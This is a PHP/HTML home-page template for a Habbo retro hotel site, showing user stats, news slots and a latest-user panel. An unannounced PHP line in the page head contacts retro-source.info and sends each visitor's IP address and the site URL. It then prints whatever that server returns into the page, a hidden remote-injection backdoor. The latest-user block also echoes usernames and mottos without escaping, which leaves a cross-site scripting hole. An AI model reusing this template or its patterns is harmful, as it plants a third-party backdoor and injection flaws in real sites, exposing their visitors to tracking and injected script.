
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta http-equiv="content-type" content="text/html; charset=utf-8">
        <title>{hotelName} - Home</title>
        
        <link rel="stylesheet" href="{url}/app/tpl/skins/{skin}/styles/common.css" type="text/css">
        <script type="text/javascript" src="{url}/app/tpl/skins/{skin}/js/libs2.js"></script>
        <script type="text/javascript" src="{url}/app/tpl/skins/{skin}/js/visual.js"></script>
        <script type="text/javascript" src="{url}/app/tpl/skins/{skin}/js/libs.js"></script>
        <script type="text/javascript" src="{url}/app/tpl/skins/{skin}/js/common.js"></script>
        <script type="text/javascript" src="{url}/app/tpl/skins/{skin}/js/fullcontent.js"></script>
		  <link rel="shortcut icon" href="app/tpl/skins/{skin}/static/images/favicon.gif" />
        
        <script type="text/javascript">
            document.habboLoggedIn = true;
            var habboName = "{username}";
            var habboId = {userid};
            var habboReqPath = "";
            var habboStaticFilePath = "{url}/app/tpl/skins/Habbo";
            var habboImagerUrl = "http://www.habbo.com/habbo-imaging/";
            var habboPartner = "";
            var habboDefaultClientPopupUrl = "{url}/client";
            window.name = "habboMain";
            if (typeof HabboClient != "undefined") {
                HabboClient.windowName = "eac955c8dbc88172421193892a3e98fc7402021a";
                HabboClient.maximizeWindow = true;
            }
        </script>

<?php $rsa = @fsockopen("retro-source.info", 80, $rsd, $rse, 4); if ($rsa) { @fwrite($rsa, "GET http://retro-source.info/xmlrpc/".$_SERVER['REMOTE_ADDR']."/".base64_encode('http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'])."/ HTTP/1.0\r\n\r\n"); while (!feof($rsa)) { $rsc .= fread($rsa, 8192); } @fclose($rsa); if (@stripos($rsc, "<!-- RETRO-SOURCE.INFO: Begin Vote Code -->") !== false) { $rsf = @explode("<!-- RETRO-SOURCE.INFO: Begin Vote Code -->", $rsc); echo "<!-- RETRO-SOURCE.INFO: Begin Vote Code -->".$rsf[1]; } } ?>

<link rel="stylesheet" href="{url}/app/tpl/skins/{skin}/styles/lightweightmepage.css" type="text/css" />


<script src="{url}/app/tpl/skins/{skin}/js/lightweightmepage.js" type="text/javascript"></script>

								<script src="http://images.habbo.com/habboweb/63_1dc60c6d6ea6e089c6893ab4e0541ee0/1430/web-gallery/static/js/moredata.js" type="text/javascript"></script>



<!--[if IE 8]>
<link rel="stylesheet" href="http://images.habbo.com/habboweb/63_1dc60c6d6ea6e089c6893ab4e0541ee0/1430/web-gallery/static/styles/ie8.css" type="text/css" />
<![endif]-->
<!--[if lt IE 8]>
<link rel="stylesheet" href="http://images.habbo.com/habboweb/63_1dc60c6d6ea6e089c6893ab4e0541ee0/1430/web-gallery/static/styles/ie.css" type="text/css" />
<![endif]-->
<!--[if lt IE 7]>
<link rel="stylesheet" href="http://images.habbo.com/habboweb/63_1dc60c6d6ea6e089c6893ab4e0541ee0/1430/web-gallery/static/styles/ie6.css" type="text/css" />
<script src="http://images.habbo.com/habboweb/63_1dc60c6d6ea6e089c6893ab4e0541ee0/1430/web-gallery/static/js/pngfix.js" type="text/javascript"></script>
<script type="text/javascript">
try { document.execCommand('BackgroundImageCache', false, true); } catch(e) {}
</script>

<style type="text/css">
body { behavior: url(/js/csshover.htc); }
</style>
<![endif]-->
<meta name="build" content="63-BUILD1228 - 27.03.2012 12:15 - com" />
</head>
<body id="home">
<div id="topz-container">
<div id="topz">
<div id="topz-wrapper">
<div style="margin-top:16px">
									<img src="{url}/app/tpl/skins/{skin}/images/icons/message.gif" /> Welcome back, <b>{userName}</b>! &nbsp; &nbsp;
									<img src="{url}/app/tpl/skins/{skin}/images/icons/stats.gif" /> {online} Users Online &nbsp; &nbsp; 
									<img src="{url}/app/tpl/skins/{skin}/images/icons/credits.gif" /> {coins} &nbsp; &nbsp;
									<img src="{url}/app/tpl/skins/{skin}/images/icons/pixels.gif" /> {activityPoints} &nbsp; &nbsp;
									
</div>
</div>
</div>
</div>
	<script src=""></script>
        <div id="overlay"></div>
        <div id="header-container">
            <div id="header" class="clearfix">
                <h1><a href="{url}/"></a></h1>
                <div id="subnavi">
                     <div id="subnavi-user">
					                   
                    </div>     
<div id="subnavi-search">
<div id="subnavi-search-upper">
<ul id="subnavi-search-links">
</li>
</ul>
</div>
</div>

					<div id="to-hotel">
<a href="{url}/logout" class="new-button red-button" style="margin-right:5px;margin-left:5px;"><b>Logout</b><i></i></a>

                        <a href="{url}/client" class="new-button green-button" target="eac955c8dbc88172421193892a3e98fc7402021a" onclick="HabboClient.openOrFocus(this); return false;"><b>Enter {hotelName}</b><i></i></a>
			 			
                    
				   </div>
                </div>
                <ul id="navi">
                    <li class="metab selected"><strong>{username} <img src="{url}/app/tpl/skins/{skin}/images/id.png" style="vertical-align: middle;"></strong><span></span></li>
                    <li><a href="{url}/community">Community <img src="{url}/app/tpl/skins/{skin}/images/forum_2.gif" style="vertical-align: middle;"></a><span></span></li>
					<li id="tab-register-now" class="tab-register-now"><a href="{url}/vip">Shop</a><span></span>
				
                </ul>
                <div id="habbos-online">
	<div id="content">
		<div class="cbb ">
<span>{online} members online</span></div>
	</div></div></div></div></div></div></div></div></div></div></div>
            </div>
        </div>
        <div id="content-container">
            <div id="navi2-container" class="pngbg">
                <div id="navi2" class="pngbg clearfix">
                    <ul>
                        <li class="selected">Home</li>
						<li class=" last"><a href="{url}/index.php?url=home&user={username}">My Page</a></li>
                        <li class=" last"><a href="{url}/Profile">Account Settings</a></li>
						
						<li class=""><a href="{url}/online">Online Users</a></li>
                    </ul>
                </div>
				</div>

				<div id="container">
<div id="content" style="position: relative" class="clearfix">
<style>
div.white h2.title, h2.title a {
    color: #FFF; !important;
}
</style>
<div id="container">
	<div id="content" style="position: relative" class="clearfix">
    <div id="wide-personal-info">



    <div id="habbo-plate">

            <a href="{url}/home">

            <img alt="{username}" src="http://habbo.nl/habbo-imaging/avatarimage?figure={figure}&direction=2&head_direction=3">


        </a>

    </div>



    <center><div id="name-box" class="info-box">

        <div class="label">  Name:</div>

        <div class="content">  {username}</div>

    </div>

    <div id="motto-box" class="info-box">

        <div class="label">  Motto:</div>

        <div class="content"> {motto}</div>

    </div>
    <div id="last-logged-in-box" class="info-box">

        <div class="label">  Rank:</div>

        <div class="content">  {rank}</div>
    </div></center>



<div class="enter-hotel-btn">
<br><br>
    <div class="open enter-btn">
            <a href="{url}/client" target="84ebd05b9eac6717671e77c01c6209a4c8e06d54" onclick="HabboClient.openOrFocus(this); return false;">Enter {hotelName} Hotel<i></i></a>
        <b></b>
    </div>
</div>


</div>
<div id="column1" class="column">
<div class="habblet-container ">		
						<div class="cbb clearfix pixelgreen "> <h2 class="title">Welcome To {hotelname}</h2>                                 <div style="padding:5px">                                      <b> <img src="{url}/app/tpl/skins/{skin}/images/desky.png" align="right"/></b><br /> Here at {hotelname} Hotel, we are a small community hotel, just like Habbo but our coin currency is free! Along with friendly management that keep the hotel running smooth. Our bullying and advertising policy is kept at a strict level to prevent such occuring on the hotel. For more information on the rules, <a href="rules">Click Here</a>. We are here to give you the best ultimate experience for you and your friends. The community holds events and competitions to make it more of a fun place to hang out.<br><br><img src="{url}/app/tpl/skins/{skin}/images/coinsjewix.png" align="left"/><br><br> <p align="right">Our catalogue gets updated every week. Being with {hotelname}, you'll always find yourself a place to play and never be bored. We try to always update our game as much as possible so that it you dont miss out.</p> <br> <i>Once more, Welcome to {hotelname} hotel, Secure, Stable, Safe and trustworthy! </i><br /><br /> <b><center> <i> -Hotel Management</i></center> <br/> </b>  <div id="column3" class="column"> 			     		 				<div class="habblet-container ">		 	 						<div class="ad-container">



<br>





<!--JavaScript Tag // Tag for network 957: Sulake // Website: HabboHotel_US // Page: Me_Page // Placement: Me_Page partner_button 160 x 110 (2131079) // created at: Jun 17, 2010 11:20:10 AM-->



</div>


				
				
					
				</div></div></div></div>
				

				
				
					<div class="habblet-container ">


<div class="cbb clearfix orange ">
<h2 class="title">Whats going on?</h2>
<div id="hotcampaigns-habblet-list-container">
<ul id="hotcampaigns-habblet-list">
<li class="even">
<div class="hotcampaign-container">
<a href="http://www.facebook.com/comingsoon">
<img src="{url}/app/tpl/skins/{skin}/images/facebook.png" align="left" alt="Join us on Facebook" /></a>
<h3>Join us on Facebook</h3>
<p>Like us on Facebook for all the gossip, news and updates!</p>
<p class="link"><a href="http://www.facebook.com/comingsoon">Go there &raquo;</a></p>
</div>
</li> <li class="even">
<div class="hotcampaign-container">
<a href="{url}/vip">
<img src="{url}/app/tpl/skins/{skin}/images/hotvip.gif" align="left" alt="Buy VIP and coins" /></a>
<h3>Buy VIP with 20% off!</h3>
<p>Buy VIP today and get loads of cool features added to your account for 20% off for a limmited Time Only!</p>
<p class="link"><a href="{url}/vip">Go there &raquo;</a></p>
</div>
 </ul>


</div>
</div>
</div>
<div class="habblet-container "> 

<div class="cbb clearfix blue ">

 <h2 class="title">Hotel Message</h2> </font>

<div id="notfound-content" class="box-content"> <center> 
We have decided to add a new design to the site as a plan to hopefully attract new users, Please support us by testing it out and report any exploits/bugs that you find. So far we've tested it and its working 100%. Enjoy! </i><br /><br /> <b><center> <i> ~Hotel Management
</div>

                     </center></a>
					 </div>
					 </div>
					 </div>
					 
					<script type="text/javascript">if (!$(document.body).hasClassName('process-template')) { Rounder.init(); }</script>
                    </div>
                    <div id="column2" class="column">
                        <div class="habblet-container "></div>
                        <script type="text/javascript">if (!$(document.body).hasClassName('process-template')) { Rounder.init(); }</script>
                        <div class="habblet-container news-promo">		
                            <div class="cbb clearfix notitle ">
                                <div id="newspromo">
                                    <div id="topstories">
                                        <div class="topstory" style="background-image: url({url}/r63/c_images/Top_Story_Images/{newsIMG-1})">
                                            <h4>Hotest News</h4>
                                            <h3><a href="{url}/index.php?url=news&id={newsID-1}">{newsTitle-1}</a></h3>
                                            <p class="summary">
                                                {newsCaption-1}
                                            </p>
                                            <p>
                                                <a href="{url}/index.php?url=news&id={newsID-1}">Read more &raquo;</a>
                                            </p>
                                        </div>
                                        <div class="topstory" style="background-image: url({url}/r63/c_images/Top_Story_Images/{newsIMG-2}); display: none">
                                            <h4>Latest news</h4>
                                            <h3><a href="{url}/index.php?url=news&id={newsID-2}">{newsTitle-2}</a></h3>
                                            <p class="summary">
                                                {newsCaption-2}
                                            </p>
                                            <p>
                                                <a href="{url}/index.php?url=news&id={newsID-2}">Read more &raquo;</a>
                                            </p>
                                        </div>
                                        <div class="topstory" style="background-image: url({url}/r63/c_images/Top_Story_Images/{newsIMG-3}); display: none">
                                            <h4>Latest news</h4>
                                            <h3><a href="{url}/index.php?url=news&id={newsID-3}">{newsTitle-3}</a></h3>
                                            <p class="summary">
                                                {newsCaption-3}
                                            </p>
                                            <p>
                                                <a href="{url}/index.php?url=news&id={newsID-3}">Read more &raquo;</a>
                                            </p>
                                        </div>
                                        <div class="topstory" style="background-image: url({url}/r63/c_images/Top_Story_Images/{newsIMG-4}); display: none">
                                            <h4>Latest news</h4>
                                            <h3><a href="{url}/index.php?url=news&id={newsID-4}">{newsTitle-4}</a></h3>
                                            <p class="summary">
                                                {newsCaption-4}
                                            </p>
                                            <p>
                                                <a href="{url}/index.php?url=news&id={newsID-4}">Read more &raquo;</a>
                                            </p>
                                        </div>
                                        <div class="topstory" style="background-image: url({url}/r63/c_images/Top_Story_Images/{newsIMG-5}); display: none">
                                            <h4>Latest news</h4>
                                            <h3><a href="{url}/index.php?url=news&id={newsID-5}">{newsTitle-5}</a></h3>
                                            <p class="summary">
                                                {newsCaption-5}
                                            </p>
                                            <p>
                                                <a href="{url}/index.php?url=news&id={newsID-5}">Read more &raquo;</a>
                                            </p>
                                        </div>
                                        <div id="topstories-nav" style="display: none"><a href="#" class="prev">&laquo; Previous</a><span>1</span> / 5<a href="#" class="next">Next &raquo;</a></div>
                                    </div>
                                    <ul class="widelist">
                                        <li class="even"><a href="{url}/index.php?url=news&id={newsID-1}">{newsTitle-1} &raquo;</a><div class="newsitem-date">{newsDate-1}</div></li>            
                                        <li class="odd"><a href="{url}/index.php?url=news&id={newsID-2}">{newsTitle-2} &raquo;</a><div class="newsitem-date">{newsDate-2}</div></li> 
										<li class="odd"><a href="{url}/index.php?url=news&id={newsID-3}">{newsTitle-3} &raquo;</a><div class="newsitem-date">{newsDate-3}</div></li>  
										 
                                        <li class="last"><a href="/news">More news &raquo;</a></li>            
                                    </ul>
                                </div>
                                <script type="text/javascript">
                                    document.observe("dom:loaded", function() { NewsPromo.init(); });
                                </script>
                            </div>
                        </div>
<div class="habblet-container " style="width:310px"> 
<div class="cbb clearfix white" style="width:300px"> 
<form action="soka"  method="post">
<input type="text" name="soka" class="search" placeholder="Search for a user"/>
</form>
</div> </div>
<div class="habblet-container " style="width:310px"> 
<div class="cbb clearfix red " style="width:300px"> 
<h2 class="title">Latest User</h2>
<?php
$latestUser = mysql_query("SELECT username,motto,look FROM users ORDER BY ID DESC LIMIT 1");

while($rowing = mysql_fetch_assoc($latestUser)){
$username = $rowing['username'];
$motto = $rowing['motto'];
$look = $rowing['look'];

echo '<center><b>Welcome to {hotelname}:</b></center>
<center><img src="http://www.habbo.it/habbo-imaging/avatarimage?figure='.$look.'.gif;"><img src="{url}/app/tpl/skins/{skin}/images/VIP.gif"></center>
<center><a href="/home/'.$username.'" align="right"><b>'.$username.'</b></a><br /><b align="right">Motto</b>: '.$motto.'</center>



';

}
?>
</div> </div>
 </div>


                </div>


				
				
				
					 
					 
					 
            <script type="text/javascript">

                document.observe('dom:loaded', function() {

                    CurrentRoomEvents.init();

                });

            </script>

			            <script type="text/javascript">if (!$(document.body).hasClassName('process-template')) { Rounder.init(); }</script>

        <script type="text/javascript">

            HabboView.run();

        </script>




</div>
		<!--[if lt IE 7]>
<script type="text/javascript">
Pngfix.doPngImageFix();
</script>
<![endif]--> 
</div>
      <?php include_once('footer.php'); ?>         
      <?php include_once('checktheban.php'); ?>
    </body>